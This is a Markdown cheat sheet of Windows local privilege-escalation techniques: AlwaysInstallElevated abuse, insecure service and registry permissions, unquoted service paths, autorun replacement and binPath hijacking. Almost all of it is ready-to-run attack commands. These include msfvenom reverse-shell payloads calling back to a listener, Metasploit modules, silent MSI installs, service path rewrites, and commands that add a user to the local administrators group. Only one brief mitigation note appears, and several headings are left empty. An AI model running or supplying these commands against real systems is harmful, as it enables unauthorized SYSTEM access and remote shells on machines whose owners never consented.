- [Always Install Elevated method](#Always-Install-Elevated-Method)
- [Insecure Service Permissions](#Insecure-Service-Permissions)
- [Insecure Registery Permissions](#Insecure-Registery-Permissions)
- [Unquoted Service Paths](#Unquoted-Service-Paths)
- [Autorun](#Autorun)
- [binPath](#binPath)
- [Hot Potato](#HotPotato)
- [Password](#Password)
 - [Configuration Files](#Configuration-Files)
 - [Memory](#Memory)
 - [Kernel Exploits](#Kernel-Exploits)
-------------------------------------------------------------------------------------------------------------------------------
# Always Install Elevated Method

For this purpose the AlwaysInstallElevated policy feature is used to install a MSI package file with elevated (system) privileges.
his policy if enabled in the Local Group Policy editor; directs the Windows Installer engine to use elevated permissions when it installs 
any program on the system.
From the security point of view this can be abused by an attacker in order to escalate his privileges to the box to SYSTEM.

### Check registry keys
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- Value **0x1** means that the AlwaysInstallElevated policy is enabled

### Privilege Escalation with Metasploit
```
use exploit/windows/local/always_install_elevated
set session ?
set LHOST 192.168.100.1
exploit
```

### Create MSI Package with PowerSploit
```
PS C:\Users\test> Import-Module Privesc
PS C:\Users\test> Get-RegistryAlwaysInstallElevated
PS C:\users\test> Write-UserAddMSI
```

### Create MSI Package with msfvenom
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<local_ip_address> lport=<local_port> –f msi > malicious.msi
```

### Execute the MSI package file on the Windows command prompt
```
>msiexec /quiet /qn /i malicious.msi

/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation
```

#### Mitigation
- Disable below settings from the GPO
```
Computer Configuration\Administrative Templates\Windows Components\Windows Installer
User Configuration\Administrative Templates\Windows Components\Windows Installer
```
--------------------------------------------------------------------------------------------------------------------------------
# Insecure Service Permissions

Unconfigured Windows OS services allows some users to configure them.

### Check services 
Check which services we have permissions for logged in users "user". **RW** Persmissions.
If we have permissions on the service we can change the the executable file location on the target system.
```
accesschk64.exe -uwcqv "tester" *
```
### Create msfvenom payload
```
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o malicious.exe
```

### Change service path
```
sc config <service-name> binpath="c:\users\tester\appdata\local\temp\malicious.exe"
```

### Check service path
```
sc -qc <service_name>
```
-------------------------------------------------------------------------------------------------------------------------------# Insecure Registery Permissions

Increase when a service that everyone can change the service PATH in registery records.
**IMPORTANT** Check is the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE"

### Search for interesting service (best alluser in everyone group has full control permission)
- One
```
Wmic service get name | findstr /i /v "C:\Windows\\"
```
- Two (Powershell)
```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```
- Three
```
accesschk64.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

### Check registers records for insecure service (check /pace and Type of Access)
```
subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<service_name>" /display
```

### Enumerate the service (Check what service started executes BINARY_PATH_NAME)
```
sc qc <service_name>
```

### Create msfvenom payload
```
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o malicious.exe
```
 
### Change BINARY_PATH
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\<service_name>" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\tester\AppData\Local\Temp\malicious.exe" /f
```

### Start the service
```
sc start <service_name>
```
-------------------------------------------------------------------------------------------------------------------------------
# Unquoted Service Paths

When the Windows OS starting a service and If any unquoted(has space) in the PATH the service can be manipulating

### Search for unquotedsvc(Command prompt)
- 1
```
sc qc unquotedsvc
```
- 2
```
wmic service get name,displayname,pathname,startmode |findstr /i /v “C:\Windows\\” | findstr /i /v “””
```
Important, "BINARY_PATH_NAME" field displays a path that is not confined between quotes.

### Create msfvenom payload
- One
```
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o malicious.exe
```
- Two
```
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o malicious.exe
```

### Place common.exe in Windows OS(Some part of Unquoted Path)

### Run service(Command prompt)
```
sc start unquotedsvc
```
-------------------------------------------------------------------------------------------------------------------------------
# Autorun

### Check registry for AutoRun executables
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### Check autorun executables permission
```
accesschk64.exe /accepteula -wvu "C:\my\testing.exe"
```

### Create msfvenom payload
```
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o malicious.exe
```
- Rename malicious.exe to testing.exe
- Place malicious file in C:\my\testing.exe
-------------------------------------------------------------------------------------------------------------------------------
# binPath

### Searching (CMD)
```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
```
- Check have we got permission **SERVICE_CHANGE_CONFIG**

### Exploitation(CMD)
- One
```
sc config daclsvc binpath= "net localgroup administrators <user_name> /add"
```

- Two
```
sc start daclsvc
```

- Three
```
type: net localgroup administrators
```
-------------------------------------------------------------------------------------------------------------------------------
# Hot Potato

-------------------------------------------------------------------------------------------------------------------------------
# 
